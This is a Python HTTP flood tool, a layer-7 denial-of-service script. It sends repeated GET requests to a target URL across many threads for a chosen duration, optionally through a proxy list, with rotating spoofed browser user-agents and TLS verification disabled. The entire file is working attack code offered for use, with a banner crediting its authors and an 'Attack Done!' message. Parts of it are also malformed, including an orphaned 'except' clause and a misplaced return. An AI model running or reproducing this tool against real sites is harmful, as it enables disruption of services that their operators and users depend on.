import os, ssl, sys, time, socket, socks, random, threading
        from urllib import parse
except Exception as e:
        sys.exit(e)

example = ['http://website.com', 'https://website.com']

if len(sys.argv[1:]) != 5:
        print("\n       [> Developed By: FDc0d3 & Vend3ttA <]\n")
        sys.exit(f"Usage:\npython3 {__file__} {random.choice(example)} <Thread> <Time> <ProxyFile> <ProxyMode (True/False)>")

target, thread, flood_time, proxyfile, proxy_mode = str(sys.argv[1]), int(sys.argv[2]), float(sys.argv[3]), str(sys.argv[4]), str(sys.argv[5]);timeout = time.time() + 1 * flood_time

try:
        with open(proxyfile, 'r') as p:
                readproxy = p.readlines()
except FileNotFoundError:
        sys.exit(f"[!] ProxyFile: '{proxyfile}' NotFound")

if proxy_mode == "true" or proxy_mode == "True":
        proxy_mode = True

elif proxy_mode == "false" or proxy_mode == "False":
        proxy_mode = False
else:
        sys.exit("[!] ProxyMode: True/False")

def urlparser(url):
        parser = {}
        parser['path'] = parse.urlparse(url).path
        if parser['path'] == '':
                parser['path'] = '/'
        parser['host'] = parse.urlparse(url).netloc
        parser['scheme'] = parse.urlparse(url).scheme
        if ':' in parse.urlparse(url).netloc:
                parser['port'] = parse.urlparse(url).netloc.split(":")[1]
        else:
                parser['port'] = '443' if parse.urlparse(url).scheme == 'https' else '80'
                return parser


useragents = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:99.0) Gecko/20100101 Firefox/99.0",
    "Opera/9.80 (Android; Opera Mini/7.5.54678/28.2555; U; ru) Presto/2.10.289 Version/12.02",
    "Mozilla/5.0 (Windows NT 10.0; rv:91.0) Gecko/20100101 Firefox/91.0",
    "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 10.0; Trident/6.0; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E)",
    "Mozilla/5.0 (Android 11; Mobile; rv:99.0) Gecko/99.0 Firefox/99.0",
    "Mozilla/5.0 (iPad; CPU OS 15_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/99.0.4844.59 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 14_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0.1 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Linux; Android 10; JSN-L21) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.58 Mobile Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.84 Safari/537.36",
]

# chromedriver headears
def headers(url):
        req =  'GET '+urlparser(url)['path']+' HTTP/1.1\r\n'
        req += 'Host: '+urlparser(url)['host'] +'\r\n'
        req += 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\r\n'
        req += 'Accept-Encoding: gzip, deflate, br\r\n'
        req += 'Accept-Language: ko,ko-KR;q=0.9,en-US;q=0.8,en;q=0.7\r\n'
        req += 'Cache-Control: max-age=0\r\n'
        req += f'sec-ch-ua: "Chromium";v="100", "Google Chrome";v="100"\r\n'
        req += 'sec-ch-ua-mobile: ?0\r\n'
        req += 'sec-ch-ua-platform: "Windows"\r\n'
        req += 'sec-fetch-dest: empty\r\n'
        req += 'sec-fetch-mode: cors\r\n'
        req += 'sec-fetch-site: same-origin\r\n'
        req += 'Connection: Keep-Alive\r\n'
        req += 'User-Agent: ' + random.choice(useragents) + '\r\n\r\n\r\n'
        return req

def attack():
        proxy = random.choice(readproxy).strip().split(":")
        while time.time() < timeout:
                with socks.socksocket() as sock:
                        sock.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
                        if proxy_mode == True:
                                sock.set_proxy(socks.HTTP, str(proxy[0]), int(proxy[1]))
                                sock.settimeout(5)
                        try:
                                sock.connect((str(urlparser(target)['host']), int(urlparser(target)['port'])))
                                if urlparser(target)['scheme'] == 'https':
                                        ctx = ssl.create_default_context()
                                        ctx.check_hostname = False
                                        ctx.verify_mode = ssl.CERT_NONE
                                        sock = ctx.wrap_socket(sock, server_hostname=urlparser(target)['host'])
                        except:
                                sock.close()
                                continue
                        for _ in range(100):
                                try:
                                        sock.send(str.encode(headers(target)))
                                        sock.send(str.encode(headers(target)))
                                except:
                                        pass

def banner(target, thread, flood_time):
        print("""

                ╔═════════════════════════════════════╗
                ║  ╔═╗╔╦╗╔╦╗╔═╗╔═╗╦╔═   ╔═╗╔═╗╔╗╔╔╦╗  ║
                ║  ╠═╣ ║  ║ ╠═╣║  ╠╩╗   ╚═╗║╣ ║║║ ║   ║
                ║  ╩ ╩ ╩  ╩ ╩ ╩╚═╝╩ ╩   ╚═╝╚═╝╝╚╝ ╩   ║
                ╚═════╦═════════════════════════╦═════╝
         ╔════════════╩═════════════════════════╩═══════════╗
           TARGET : {0}
           THREAD : {1}
           PROXY  : {2} = {4}
           TIME   : {3}
         ╚══════════════════════════════════════════════════╝
""".format(str(target), int(thread), len(readproxy), int(flood_time), str(proxy_mode)))

def timer(t):
        while t > 0:
                minutes, seconds = divmod(t, 60)
                hours, minutes = divmod(minutes, 60)
                time_left = str(hours).zfill(2)+":"+str(minutes).zfill(2)+":"+str(seconds).zfill(2)
                print("TIME: "+time_left+"\r", end="")
                time.sleep(1)
                t = t -1
                if t == 0:
                        print("[*] Attack Done! Exiting...")
                        break

def main():
        for _ in range(thread):
                threading.Thread(target=attack).start()
                os.system('clear');banner(target, thread, flood_time)
                timer(flood_time)

if __name__ == '__main__':
        main()
